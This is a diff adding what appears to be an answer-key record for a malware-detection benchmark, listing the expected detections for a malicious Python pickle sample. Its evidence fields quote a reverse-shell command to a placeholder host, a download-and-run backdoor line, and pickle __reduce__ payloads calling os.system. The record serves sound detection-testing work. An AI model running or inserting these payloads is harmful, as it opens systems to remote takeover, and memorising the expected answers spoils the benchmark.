@@ -1,0 +1,84 @@
+{
+  "sample_id": "adv-032-pickle-unsafe",
+  "test_category": "dynamic_code_obfuscation",
+  "benchmark_marker": "BENCHMARK_TEST_ONLY",
+  "expected_detections": [
+    {
+      "detection_id": "DYNAMIC-008",
+      "detection_name": "Pickle/marshal deserialization",
+      "description": "Unsafe deserialization of pickle/marshal data enabling RCE",
+      "severity": "critical",
+      "confidence": 0.98,
+      "evidence": [
+        "pickle.loads(config_data)",
+        "pickle.load(f)",
+        "pickle.loads(data) from remote URL",
+        "marshal.loads(marshaled_data)"
+      ]
+    },
+    {
+      "detection_id": "RCE-001",
+      "detection_name": "__reduce__ exploitation",
+      "description": "Pickle __reduce__ method used to execute arbitrary code",
+      "severity": "critical",
+      "confidence": 0.99,
+      "evidence": [
+        "def __reduce__(self): return (os.system, ('curl...'))",
+        "def __reduce__(self): return (subprocess.Popen, ...)",
+        "def __reduce__(self): return (eval, ...)"
+      ]
+    },
+    {
+      "detection_id": "BACKDOOR-002",
+      "detection_name": "Reverse shell payload",
+      "description": "Pickle payload designed to establish reverse shell",
+      "severity": "critical",
+      "confidence": 0.97,
+      "evidence": [
+        "bash -i >& /dev/tcp/[REDACTED].example.com/4444 0>&1"
+      ]
+    },
+    {
+      "detection_id": "PERSIST-001",
+      "detection_name": "Backdoor installation",
+      "description": "Downloading and executing backdoor script",
+      "severity": "critical",
+      "confidence": 0.96,
+      "evidence": [
+        "wget https://[REDACTED].example.com/backdoor.sh -O /tmp/b.sh && chmod +x /tmp/b.sh && /tmp/b.sh"
+      ]
+    },
+    {
+      "detection_id": "OBFUSC-003",
+      "detection_name": "Base64 encoded pickle",
+      "description": "Malicious pickle payload encoded in base64",
+      "severity": "high",
+      "confidence": 0.94,
+      "evidence": [
+        "base64.b64decode(...) followed by pickle.loads()",
+        "base64.b64encode(payload).decode()"
+      ]
+    },
+    {
+      "detection_id": "REMOTE-002",
+      "detection_name": "Remote pickle loading",
+      "description": "Fetching and deserializing pickle from untrusted URL",
+      "severity": "critical",
+      "confidence": 0.95,
+      "evidence": [
+        "urllib.request.urlopen(url); pickle.loads(data)"
+      ]
+    }
+  ],
+  "obfuscation_techniques": [
+    "Pickle __reduce__ method abuse",
+    "Base64 encoding of pickle payloads",
+    "Remote pickle fetching",
+    "Marshal code object loading",
+    "Legitimate-looking serialization utility"
+  ],
+  "risk_score": 9.9,
+  "verdict": "确认恶意",
+  "verdict_reasoning": "Classic pickle deserialization attack pattern with multiple __reduce__ exploit payloads including reverse shell and backdoor installation. Combined with remote pickle loading creates complete RCE chain. Well-known Python deserialization vulnerability deliberately exploited.",
+  "recommended_action": "block_and_alert"
+}
